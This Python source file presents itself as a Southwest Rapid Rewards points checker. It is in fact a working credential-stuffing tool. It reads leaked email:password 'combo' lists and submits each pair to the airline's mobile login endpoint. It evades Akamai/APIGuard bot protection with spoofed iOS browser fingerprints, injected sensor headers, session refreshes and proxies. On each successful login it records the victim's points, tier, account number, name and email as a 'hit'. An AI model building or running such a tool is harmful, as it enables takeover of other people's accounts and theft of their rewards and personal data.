"""Southwest Rapid Rewards points checker using the mobile API."""

from __future__ import annotations

import json
import time
import uuid
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlencode

from curl_cffi import requests

from southwest_checker.apiguard.client import APIGuardClient
from southwest_checker.constants import (
    BASE_URL,
    CLIENT_ID,
    DEFAULT_HEADERS,
    TOKEN_PATH,
)


@dataclass
class CheckResult:
    username: str
    status: str  # hit, bad, error, retry
    redeemable_points: int | None = None
    tier: str | None = None
    account_number: str | None = None
    first_name: str | None = None
    last_name: str | None = None
    email: str | None = None
    tier_qualifying_points: int | None = None
    next_tier: str | None = None
    next_tier_points_required: int | None = None
    companion_pass_points_remaining: int | None = None
    account_status: str | None = None
    error: str | None = None
    raw: dict[str, Any] = field(default_factory=dict)

    def summary(self) -> str:
        if self.status == "hit":
            name = " ".join(filter(None, [self.first_name, self.last_name]))
            return (
                f"[HIT] {self.username} | Points: {self.redeemable_points:,} | "
                f"Tier: {self.tier} | Account: {self.account_number} | "
                f"Name: {name} | Email: {self.email}"
            )
        if self.status == "bad":
            return f"[BAD] {self.username} | {self.error or 'Invalid credentials'}"
        if self.status == "retry":
            return f"[RETRY] {self.username} | {self.error or 'Rate limited / sensor expired'}"
        return f"[ERROR] {self.username} | {self.error}"


def _flatten_key(key: str) -> str:
    """Normalize response keys like customers.userInformation.redeemablePoints."""
    return key.split(".")[-1]


def _parse_login_response(data: dict[str, Any]) -> dict[str, Any]:
    """Extract user fields from the flat dotted-key login response."""
    flat: dict[str, Any] = {}
    for key, value in data.items():
        flat[_flatten_key(key)] = value
    return flat


class SouthwestChecker:
    def __init__(
        self,
        sensor_headers: dict[str, str] | None = None,
        base_headers: dict[str, str] | None = None,
        cookies: str | None = None,
        impersonate: str = "safari17_2_ios",
        proxy: str | None = None,
        auto_sensors: bool = False,
        full_bootstrap: bool = False,
        capture_data: dict[str, Any] | None = None,
    ):
        self.sensor_headers = sensor_headers or {}
        self.base_headers = dict(base_headers or {})
        self.cookies = cookies
        if capture_data:
            if not self.cookies:
                self.cookies = capture_data.get("cookies")
            if not self.sensor_headers:
                self.sensor_headers = capture_data.get("sensor_headers", {})
            if not self.base_headers:
                self.base_headers = dict(capture_data.get("base_headers", {}))
        self.impersonate = impersonate
        self.proxy = proxy
        self.auto_sensors = auto_sensors
        self.full_bootstrap = full_bootstrap
        self._apiguard: APIGuardClient | None = None
        if full_bootstrap:
            self._apiguard = APIGuardClient(
                impersonate=impersonate,
                proxy=proxy,
                full_bootstrap=True,
            )
        elif auto_sensors and capture_data:
            self._apiguard = APIGuardClient.from_capture(
                capture_data, impersonate=impersonate, proxy=proxy
            )

    @classmethod
    def from_config(cls, config: dict[str, Any], **kwargs: Any) -> SouthwestChecker:
        return cls(
            sensor_headers=config.get("sensor_headers", {}),
            base_headers=config.get("base_headers", {}),
            cookies=config.get("cookies"),
            capture_data=config if config.get("sensor_headers") else None,
            **kwargs,
        )

    def _uses_generated_headers(self) -> bool:
        return bool(
            self._apiguard and (self.auto_sensors or self.full_bootstrap)
        )

    def _build_headers(self) -> dict[str, str]:
        if self._uses_generated_headers():
            assert self._apiguard is not None
            if not self._apiguard.session:
                self._apiguard.init()
            headers = self._apiguard.generate_headers(cookies=self.cookies)
            headers.update(self.base_headers)
            return headers

        headers = dict(DEFAULT_HEADERS)
        headers.update(self.base_headers)
        headers.update(self.sensor_headers)
        headers["X-User-Experience-ID"] = str(uuid.uuid4()).upper()
        headers["x-swa-di-dtid"] = str(uuid.uuid4()).upper()
        if self.cookies:
            headers["Cookie"] = self.cookies
        return headers

    def _build_body(self, username: str, password: str) -> str:
        return urlencode(
            {
                "scope": "openid",
                "username": username,
                "response_type": "id_token swa_token",
                "client_id": CLIENT_ID,
                "password": password,
            }
        )

    def check(self, username: str, password: str, retries: int = 2) -> CheckResult:
        if not self.sensor_headers and not self._uses_generated_headers():
            return CheckResult(
                username=username,
                status="error",
                error=(
                    "No sensor headers loaded. Extract from a .chlz capture first, "
                    "or use --full-bootstrap."
                ),
            )

        session = requests.Session(impersonate=self.impersonate)
        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else None
        body = self._build_body(username, password)

        resp = None
        last_exc: Exception | None = None
        for attempt in range(retries + 1):
            headers = self._build_headers()
            try:
                resp = session.post(
                    f"{BASE_URL}{TOKEN_PATH}",
                    headers=headers,
                    data=body,
                    timeout=30,
                    proxies=proxies,
                )
            except Exception as exc:
                last_exc = exc
                if attempt < retries:
                    time.sleep(1.5 * (attempt + 1))
                continue

            if resp.status_code != 429:
                break

            if attempt < retries:
                if self._apiguard:
                    if self.full_bootstrap:
                        self._apiguard.refresh_session_headers()
                    else:
                        self._apiguard.session = None
                        self._apiguard.refresh_if_needed(force=True)
                time.sleep(2.5 * (attempt + 1))

        if resp is None:
            return CheckResult(
                username=username,
                status="error",
                error=str(last_exc) if last_exc else "Request failed",
            )

        if resp.status_code == 429:
            return CheckResult(
                username=username,
                status="retry",
                error="Akamai blocked (429) — sensor headers may be expired",
            )

        try:
            data = resp.json()
        except json.JSONDecodeError:
            return CheckResult(
                username=username,
                status="error",
                error=f"Non-JSON response ({resp.status_code}): {resp.text[:200]}",
            )

        if resp.status_code == 400 or data.get("error") == "invalid_grant":
            return CheckResult(
                username=username,
                status="bad",
                error=data.get("error", "invalid_grant"),
                raw=data,
            )

        if resp.status_code != 200:
            return CheckResult(
                username=username,
                status="error",
                error=f"HTTP {resp.status_code}: {data.get('message', resp.text[:200])}",
                raw=data,
            )

        info = _parse_login_response(data)
        return CheckResult(
            username=username,
            status="hit",
            redeemable_points=info.get("redeemablePoints"),
            tier=info.get("tier"),
            account_number=info.get("accountNumber"),
            first_name=info.get("firstName"),
            last_name=info.get("lastName"),
            email=info.get("primaryEmail"),
            tier_qualifying_points=info.get("tierQualifyingPoints"),
            next_tier=info.get("nextTierTargeted"),
            next_tier_points_required=info.get("nextTierQualifyingPointsRequired"),
            companion_pass_points_remaining=info.get("companionQualifyingPointsRemaining"),
            account_status=info.get("accountStatus"),
            raw=data,
        )


def normalize_login(login: str) -> str:
    """Convert email:pass login part to Southwest username when needed."""
    login = login.strip()
    if "@" in login:
        login = login.split("@", 1)[0].strip()
    return login


def parse_combo(line: str) -> tuple[str, str] | None:
    """Parse username:password from a combo line.

    Accepts email:password combos and extracts the local part before @ as
    the Southwest Rapid Rewards username.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    login, _, password = line.partition(":")
    username = normalize_login(login)
    password = password.strip()
    if not username or not password:
        return None
    return username, password


def load_combos(path: str) -> list[tuple[str, str]]:
    combos: list[tuple[str, str]] = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for line in f:
            parsed = parse_combo(line)
            if parsed:
                combos.append(parsed)
    return combos
